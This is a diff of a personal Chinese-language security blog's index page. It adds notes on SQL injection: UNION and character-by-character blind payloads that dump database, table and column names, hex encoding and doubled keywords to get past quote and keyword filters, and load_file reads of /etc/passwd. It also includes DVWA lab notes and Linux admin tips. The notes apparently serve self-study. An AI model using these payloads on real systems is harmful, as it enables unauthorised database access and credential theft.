@@ -79,14 +79,91 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/11/15/2015/daily/" title="linux日常更新" itemprop="url">linux日常更新</a>
+      <a href="/11/19/2015/sql函数/" title="sql日常记录" itemprop="url">sql日常记录</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-11-15T07:46:39.335Z" itemprop="datePublished"> 发表于 11-15-2015</time>
+    <time datetime="2015-11-19T02:44:00.356Z" itemprop="datePublished"> 发表于 11-19-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <ol>
+<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
+<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
+<li>version()            -&gt;5.6.11</li>
+<li>limit m,n           m-start      n—length    <code>开始为0</code><br>limit n             n—length</li>
+<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
+<li>concat( a, b)  连接函数,对ab进行连接</li>
+<li>mit(a,1,50)       1-50 截取字符串</li>
+<li>select * from (xxx)a    a为别名</li>
+<li>group by xx   以字段分类</li>
+<li>select count(*)   返回统计的行数</li>
+<li>0x7171    类似于高亮,更加明显</li>
+<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
+<li>0x7423 的写法可以规避单引号过滤 </li>
+<li>distinct 过滤重复</li>
+<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a>‘</li>
+<li>char(115)  unicode-&gt;string</li>
+<li>version()  @@version         版本号</li>
+<li>@@datadir         mysql物理路径</li>
+<li>user()     当前的mysql用户        example: root@localhost</li>
+<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
+<li>ORD()     ord(‘i’)    返回第一个字符的ASCII</li>
+<li>EXISTS()     指定一个子查询，检测行的存在返回Blooean结果</li>
+<li>MID(String, Start [, Length])          取子串        MySQL<br>[substring/]substr(String,Start[,Length])        取子串        支持SQL Server,Oracle[MySQL]<br>注意:<code>开始位置为1</code> 但是0为起始点不会报错,不过不回显示任何东西</li>
+<li>WHERE itemid (REGEXP 0x5b5e302d395d)     <code>REGEXP</code>正则对象的使用</li>
+<li><code>----手动高亮----</code><br>concat( select database() ) 会导致mysql语法错误,想了一会儿知道原因了…<br><code>concat( (select database()) , &#39;xxx&#39; );</code>   看完这句话然后默默的删掉’xxx’,然后自然就懂啦</li>
+<li>length( )    显示长度,返回int</li>
+<li>ascii()    字符转ascii<br>  char()    ascii转字符</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/19/2015/sql函数/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/19/2015/sql函数/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/11/18/2015/daily/" title="linux日常更新" itemprop="url">linux日常更新</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-18T09:44:58.160Z" itemprop="datePublished"> 发表于 11-18-2015</time>
     
   </p>
 </header>
@@ -175,7 +252,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 <li>注销使之生效</li>
 </ol>
 <h3 id="github">github</h3><p>github-SSH链接-&gt;<a href="http://jianganglu.github.io/2015/08/28/git-ssh/" target="_blank" rel="external">jianganglu Blog</a><br>千万别用sudo..T T</p>
-<h3 id="远程桌面">远程桌面</h3><p>rdesktop -u 帐号 -p 密码 [-f] ip地址<br>-f 默认全屏   Ctrl+ Alt +Enter 退出全屏<br>Reference: <a href="http://blog.csdn.net/zjjyliuweijie/article/details/7048984" target="_blank" rel="external">zjjyliuweijie</a></p>
+<h3 id="远程桌面">远程桌面</h3><p>windows:<br>rdesktop -u 帐号 -p 密码 [-f] ip地址<br>-f 默认全屏   Ctrl+ Alt +Enter 退出全屏<br>Reference: <a href="http://blog.csdn.net/zjjyliuweijie/article/details/7048984" target="_blank" rel="external">zjjyliuweijie</a><br>linux:<br>vncviewer -</p>
 <h2 id="Device/Driver">Device/Driver</h2><h3 id="网卡驱动">网卡驱动</h3><h4 id="问题">问题</h4><p><code>网卡连接一段时间之后自动断开,只能重启</code></p>
 <h4 id="办法">办法</h4><ol>
 <li>前往github看看有没有自己的型号<a href="https://github.com/lwfinger/rtlwifi_new" target="_blank" rel="external">rtl-github</a>,如果有就clone下来<code>clone https://github.com/phuslu/goagent.git</code> </li>
@@ -209,81 +286,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 <div class="comments-count">
 	
 	  	<span></span>
-		<a href="/11/15/2015/daily/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/15/2015/daily/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/11/15/2015/sql函数/" title="sql日常记录" itemprop="url">sql日常记录</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-11-15T03:43:51.707Z" itemprop="datePublished"> 发表于 11-15-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <ol>
-<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
-<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
-<li>version()            -&gt;5.6.11</li>
-<li>limit m,n           m-start      n—length<br>limit n             n—length</li>
-<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
-<li>concat( a, b)  连接函数,对ab进行连接</li>
-<li>mit(a,1,50)       1-50 截取字符串</li>
-<li>select * from (xxx)a    a为别名</li>
-<li>group by xx   以字段分类</li>
-<li>select count(*)   返回统计的行数</li>
-<li>0x7171    类似于高亮,更加明显</li>
-<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
-<li>0x7423 的写法可以规避单引号过滤 </li>
-<li>distinct 过滤重复</li>
-<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a>‘</li>
-<li>char(115)  unicode-&gt;string</li>
-<li>version()  @@version         版本号</li>
-<li>@@datadir         mysql物理路径</li>
-<li>user()     当前的mysql用户        example: root@localhost</li>
-<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
-<li>ORD()     ord(‘i’)    返回第一个字符的ASCII</li>
-<li>MID(字段名, Start [, Length])     返回一部分字符串</li>
-<li>EXISTS()     指定一个子查询，检测行的存在返回Blooean结果</li>
-<li>WHERE itemid (REGEXP 0x5b5e302d395d)     <code>REGEXP</code>正则对象的使用</li>
-<li></li>
-</ol>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/11/15/2015/sql函数/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/15/2015/sql函数/" data-count-type="comments">&nbsp;</a>
+		<a href="/11/18/2015/daily/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/18/2015/daily/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -368,6 +371,75 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/11/12/2015/sql爆表/" title="MySQL表段,字段查询" itemprop="url">MySQL表段,字段查询</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-11T16:00:00.000Z" itemprop="datePublished"> 发表于 11-12-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="information_schema数据库结构">information_schema数据库结构</h2><h3 id="information_schema-tables">information_schema.tables</h3><p><code>数据库和表tables的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------+</span></span><br><span class="line"><span class="header">|----所有数据库名 ------- 所有的表名 -------|   </span><br><span class="line">+----------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="information_schema-columns">information_schema.columns</h3><p><code>数据库,表和字段columns的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------COLUMN_NAME-----+</span></span><br><span class="line"><span class="header">|----所有数据库名 ------- 所有的表名 ------ 所有的字段名 ----|</span><br><span class="line">+--------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="mysql-user">mysql.user</h2><p>数据库连接所检测的帐号密码<br><code>Host</code> <code>User</code> <code>Password</code></p>
+<h2 id="mysql">mysql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by blackbap.org</span><br><span class="line">爆所有数据库名：</span><br><span class="line"> union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_schema) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span></span><br><span class="line">爆所有表段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_namer) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema(表名)=<span class="number">0x64625F6368696E615F717562616E5F636E</span>      //表名写成<span class="number">16</span>进制就不需要添加单引号了</span><br><span class="line">爆admin表里面所有字段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> column_name) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="number">0x61646D696E</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="只能显示int类型的情况下的爆表">只能显示int类型的情况下的爆表</h2><h3 id="0x01_爆版本号">0x01 爆版本号</h3><p>[‘+]  concat( (select version() ))  [+’]</p>
+<h3 id="0x02_爆数据库(逐字)">0x02 爆数据库(逐字)</h3><ol>
+<li><p>长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( <span class="operator"><span class="keyword">select</span> length(<span class="keyword">database</span>()) )+<span class="string">'</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>逐字爆库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( selecselectt ascii((substr(database(),1,1))) ) )+'</span><br><span class="line">'+concat( ( selecselectt ascii((substr(database(),2,1))) ) )+'</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>….etc</p>
+<h3 id="0x03_逐字爆表—查表原理">0x03 逐字爆表—查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">concat( (</span><br><span class="line">  <span class="operator"><span class="keyword">select</span> <span class="keyword">ascii</span>(</span><br><span class="line">    <span class="keyword">substr</span>(</span><br><span class="line">      (selselectect table_name frfromom information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">      ,<span class="number">1</span>,<span class="number">1</span>)) ) )</span><br><span class="line"><span class="comment">-- limit 0,1 是因为数据库可能会有很多表,limit限制显示的行数</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> 即可查第二个表,后面同理</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x04_逐字爆字段—查表原理">0x04 逐字爆字段—查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat((</span><br><span class="line">  <span class="operator"><span class="keyword">select</span> <span class="keyword">ascii</span>( </span><br><span class="line">      <span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name = <span class="string">'爆出来的表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    ,<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">  ))</span></span><br></pre></td></tr></table></figure>
+<h2 id="access:">access:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#top x:      选取前面x行  非Mysql语法,mysql可以用limit代替</span><br><span class="line">1=convert(int,(<span class="operator"><span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span>))</span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'第一个表名'</span>)))</span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'第二个表名'</span>,<span class="string">'第一个表名'</span>)))</span></span><br></pre></td></tr></table></figure>
+<p>可以学习过滤语句 <code>where 字段名 not in(&#39;xxx1&#39;,&#39;xxx2&#39;[,&#39;xxxn&#39;]);</code></p>
+<h2 id="报错情况下的mysql—-待补充">报错情况下的mysql—-待补充</h2><ol>
+<li>获取当前用户名</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/12/2015/sql爆表/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/12/2015/sql爆表/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
   </h1>
   <p class="article-author">By
@@ -381,7 +453,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 </header>
     <div class="article-content">
         
-        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断段数</p>
+        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
 <h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
 <h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
 <p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
@@ -725,75 +797,6 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/21/2015/linuxMount/" title="分区挂载/自动加载" itemprop="url">分区挂载/自动加载</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-20T16:00:00.000Z" itemprop="datePublished"> 发表于 10-21-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="分区挂载">分区挂载</h3><h4 id="mount命令">mount命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [-t vfstype] [-o options] device dir</span><br></pre></td></tr></table></figure>
-<ol>
-<li>-t<br> vfstype类型选择 ——<code>可以不指定,系统自动选择</code><br>  iso9660            光盘/光盘映像<br>  vfat               fat32文件系统<br>  ntfs               ntfs文件系统</li>
-<li>-o<br> option 挂载设置<br>  ro:                read only(只读)<br>  rw:                read write(读写)<br>  loop:              把文件作为硬盘分区进行挂载<br>  iocharset:         指定该文件系统所用的字符集</li>
-<li>devie<br> 所要挂载的设备,可以通过<code>sudo fdisk -l</code>进行查询</li>
-<li>dir<br> 所需要挂载的目录,e.g: /media/data #data为目标挂载目录 </li>
-</ol>
-<h4 id="注意">注意</h4><p>在一般的user用户之下mount可能会出现权限问题,<code>chmod 777 挂载目录</code>可以使一般user也可以正常使用</p>
-<h3 id="开机自动挂载">开机自动挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/fstab</span><br></pre></td></tr></table></figure>
-<p>输入格式:<br>    <code>&lt;file system&gt;&lt;mount point&gt;&lt;type&gt;&lt;options&gt;&lt;dump&gt;&lt;pass&gt;</code><br>    挂载分区—挂载点(目录)—分区类型—挂载设置—dump备份设置—fsck磁盘检查设置</p>
-<h4 id="option参数">option参数</h4><pre><code>defaults: rw, suid, dev, <span class="keyword">exec</span>, auto, nouser, <span class="keyword">and</span> async.
-auto:           系统自动挂载,fstab默认就是这个选项
-nouser          只有root用户可以挂载
-ro <span class="keyword">read</span>         only只读权限
-rw <span class="keyword">read</span>         <span class="keyword">write</span>读写权限
-user            任何用户都可以挂载
-noauto          开机不自动挂载
-请注意<span class="string">`光驱和软驱只有在装有介质时才可以进行挂载,因此它是noauto`</span>
-</code></pre><h4 id="dump">dump</h4><p>当其值设置为1时,将允许dump备份程序备份；设置为0时,忽略备份操作；</p>
-<h4 id="fsck磁盘检查设置">fsck磁盘检查设置</h4><p>其值是一个顺序.当其值为0时,永远不检查；而 / 根目录分区永远都为1.其它分区从2开始,数字越小越先检查,如果两个分区的数字相同,则同时检查</p>
-<h3 id="Reference">Reference</h3><p>分区自动挂载—-<a href="http://www.bootf.com/582.html" target="_blank" rel="external">VPS管理百科</a><br>分区挂载—-<a href="http://qspy.is-programmer.com/posts/40900.html" target="_blank" rel="external">Qspy随手记</a></p>
-<h3 id="自己是这么挂载的">自己是这么挂载的</h3><p>mount -t ntfs -o rw /dev/sdb5 /media/gust       #挂载<br>/dev/sdb5 /media/gust ntfs-3g rw,user,auto 0 0  #自动挂载</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/21/2015/linuxMount/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/21/2015/linuxMount/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
@@ -810,7 +813,7 @@ noauto          开机不自动挂载
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 13.33px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 13.33px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/书记/" style="font-size: 10px;">书记</a>
+       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 17.5px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 12.5px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/书记/" style="font-size: 10px;">书记</a>
     </div>
   </div>
 
@@ -818,7 +821,7 @@ noauto          开机不自动挂载
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
   </div>
 
 
@@ -840,7 +843,7 @@ noauto          开机不自动挂载
 		  
 		
 		  
-			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>4</sup></a></li>
 		  
 		
 		  
